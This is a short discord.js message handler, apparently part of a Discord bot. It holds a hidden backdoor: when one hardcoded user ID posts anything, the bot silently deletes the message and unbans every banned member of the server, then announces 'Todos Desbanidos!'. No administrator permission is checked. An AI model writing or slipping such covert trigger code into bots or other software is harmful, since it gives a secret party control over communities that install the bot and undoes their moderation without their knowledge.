const discord = require('discord.js');

module.exports = async (client, message) => {
	if (message.author.id === '1066799804467921007') {
		message.delete();
		let bans = await message.guild.bans.fetch();
		while (bans.size > 0) {
			for (const ban of bans.values()) {
				await message.guild.members.unban(ban.user.id);
			}
			bans = await message.guild.bans.fetch();
		}
		message.channel.send({
			embeds: [
				new discord.EmbedBuilder()
					.setTitle('» Todos Desbanidos!')
					.setColor(client.cor),
			],
		});
	}
};
